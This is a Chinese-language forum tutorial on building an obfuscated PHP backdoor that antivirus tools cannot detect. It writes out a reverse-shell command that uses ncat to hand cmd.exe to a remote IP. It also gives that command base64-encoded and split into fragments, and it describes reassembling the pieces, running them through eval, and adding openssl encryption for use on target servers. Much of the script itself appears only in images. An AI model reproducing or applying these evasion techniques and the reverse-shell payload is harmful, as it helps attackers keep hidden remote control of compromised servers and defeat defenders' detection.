0x00 前言
=======

今天分享一个 PHP 后门混淆的创作流程，主要遵循以下规则：

1、使用多种不同国家的语言

2、所有 php 代码和系统执行命令都要做混淆

3、变量名中可以添加下划线等特殊字符，比如：

```php
$最後の4
$最後の3
$最後の_3
$最_後の1
```

0x01 开始制作PHP混淆后门
================

我们以 ncat.exe 为例，比如命令：

```php
system("start /b ncat.exe 192.168.245.213 443 -e cmd.exe");
```

首先对上面的命令进行 base64 编码，编码后的文本：

```php
c3lzdGVtKCJzdGFydCAvYiBuY2F0LmV4ZSAxOTIuMTY4LjI0NS4yMTMgNDQzIC1lIGNtZC5leGUiKTs=
```

对于 base64 编码而言，最后的 = 号是其特征，我们可以将其删除，也不会有什么影响，接下来可以将上面的字符串进行分割，比如：

```php
c3lzdGVtKCJ || zdGFydCA || vYiBuY2F0LmV4ZS || AxOTIuMTY4L || jI0NS4 || yMTMgNDQzIC1l || IGNtZC5leGUiKTs
```

然后将分割后的字符串嵌入到脚本中，如图：

![1.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4e0f3c952d9996b2f50a7ac7713c669648c8ee56.png)

以上是我们最终输出的脚本，红框中标注的就是我们需要执行的命令进行 base64 编码然后分割的部分。

接下来基于这个脚本来进行介绍，下图中标注的部分是对 base64 解码函数的分割混淆：

![2.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b3e3368ddde6eaf98993c54d2cd2e07c44d101b2.png)

如何将分割后的字符串拼接起来呢？请看下图：

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5902e26a11d1bd03019ec366457628da80bb9b1c.png)

最后是命令执行参数部分的混淆，如图：

![4.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-24683aa0a016e1cd22f412e5d7753b14bfca8186.png)

从脚本可以看到，变量和参数值之间不断的变换，从而达到混淆的目的。最后通过 eval 来执行解码后的命令：

![5.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3d7d127a4e085e07825a391fc3a88f6aa6ec3922.png)

最后的执行效果：

![6.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-37d2c0c5513651abfe5e9513ad1d453f0c5b7b13.png)

如果目标启用了 openssl 的加密扩展，我们可以将其润色一下，如图：

![7.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-571ea9e767a3acc6e038a6b51819e62493f25332.png)

我们首先将之前处理好的脚本进行 base64 编码，来预防加密过程中出现错误，然后使用 openssl 的扩展进行加密，在目标服务器上使用时进行解密执行即可，如图：

![8.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-698167f25ccd74c4ec979e0ca4fe7b767e30f6b2.png)

到这个整个混淆的过程就结束了。

0x02 总结
=======

混淆是一门艺术，通过各种变化来实现脚本的免杀，后门查杀通常是使用正则表达式来进行静态匹配，而绕过大量已有正则的覆盖，就能实现免杀的效果，当然，这种方式也可能成为查杀工具的养料，自己学会变换的核心原理，就能实现真正意义上的免杀。